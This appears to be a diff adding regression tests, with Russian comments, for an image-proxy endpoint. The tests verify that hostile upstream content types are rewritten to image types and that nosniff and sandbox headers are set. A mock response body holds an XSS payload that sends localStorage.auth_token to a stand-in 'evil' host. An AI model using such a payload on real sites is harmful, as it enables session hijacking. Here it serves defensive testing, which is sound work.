@@ -101,3 +101,56 @@ describe('isSafeProxyImageUrl', () => {
     expect(isSafeProxyImageUrl('not a url').ok).toBe(false);
   });
 });
+
+/**
+ * Content-Type апстрима наружу не отдаётся.
+ *
+ * Находка ревью 2026-07-28 (P1): заголовок апстрима ставился в ответ как есть.
+ * Прокси публичный и отвечает с НАШЕГО origin, поэтому text/html от чужого
+ * сервера исполнялся бы в контексте приложения. CSP выключен, auth_token лежит
+ * в localStorage — то есть это готовый угон сессии через <img src=...>.
+ */
+describe('GET /api/proxy-image — тип ответа', () => {
+  const respondWith = (contentType: string) => {
+    H.axiosGet.mockResolvedValue({
+      status: 200,
+      data: Buffer.from('<script>fetch("//evil/"+localStorage.auth_token)</script>'),
+      headers: { 'content-type': contentType },
+    });
+    return request(app).get('/api/proxy-image').query({ url: 'https://cdn.example.com/a.png' });
+  };
+
+  for (const hostile of ['text/html', 'text/html; charset=utf-8', 'image/svg+xml', 'application/xhtml+xml', 'text/xml']) {
+    it(`${hostile} не доезжает до браузера`, async () => {
+      const res = await respondWith(hostile);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toMatch(/^image\/jpeg/);
+      expect(res.headers['content-type']).not.toMatch(/html|svg|xml/);
+    });
+  }
+
+  it('нормальные типы картинок сохраняются', async () => {
+    for (const ok of ['image/png', 'image/webp', 'image/gif', 'image/avif']) {
+      const res = await respondWith(ok);
+      expect(res.headers['content-type']).toMatch(new RegExp(`^${ok}`));
+    }
+  });
+
+  it('регистр и параметры заголовка нормализуются', async () => {
+    const res = await respondWith('IMAGE/PNG; charset=binary');
+    expect(res.headers['content-type']).toMatch(/^image\/png/);
+  });
+
+  it('отсутствующий тип → image/jpeg', async () => {
+    H.axiosGet.mockResolvedValue({ status: 200, data: Buffer.from('x'), headers: {} });
+    const res = await request(app).get('/api/proxy-image').query({ url: 'https://cdn.example.com/a.png' });
+    expect(res.headers['content-type']).toMatch(/^image\/jpeg/);
+  });
+
+  it('ответ помечен nosniff и запрещён к исполнению', async () => {
+    const res = await respondWith('image/png');
+    expect(res.headers['x-content-type-options']).toBe('nosniff');
+    expect(res.headers['content-security-policy']).toContain('sandbox');
+  });
+});
